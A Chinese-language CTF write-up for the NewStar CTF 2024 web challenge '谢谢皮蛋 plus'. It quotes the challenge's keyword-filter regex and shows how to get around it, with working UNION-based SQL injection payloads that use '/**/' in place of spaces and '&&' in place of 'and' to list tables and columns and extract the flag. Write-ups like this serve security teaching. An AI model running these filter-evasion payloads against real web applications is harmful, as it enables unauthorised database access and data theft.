---
titleTemplate: ':title | WriteUp - NewStar CTF 2024'
---

# 谢谢皮蛋 plus

同样还是联合注入，意在考察空格和 `and` 的绕过，为了避免直接使用报错注入得到 flag，将报错注入 ban 了

```php
preg_match_all("/ |extractvalue|updataxml|and/i",$id)
```

值得注意的一个点是，这题是双引号闭合，如果没有细心的检查会误以为是单引号闭合

![注意引号的闭合种类](/assets/images/wp/2024/week2/pidan-plus_1.png)

双引号中带有单引号也可以执行成功，属于 MySQL 的一种特性，可以自行尝试一下

![双引号中带有单引号也可以执行成功](/assets/images/wp/2024/week2/pidan-plus_2.png)

`and` 使用 `&&` 替换，空格使用 `/**/` 替换，其他就是一样的操作了

查询当前数据库

```sql
-1"/**/union/**/select/**/1,database()#
```

查询所有表名

```sql
-1"/**/union/**/select/**/1,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/=/**/database()#
```

查询所有列名

```sql
-1"/**/union/**/select/**/1,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/=/**/'Fl4g'/**/&&/**/table_schema/**/=/**/database()#
```

得到flag

```sql
-1"/**/union/**/select/**/group_concat(des),group_concat(value)/**/from/**/Fl4g#
```
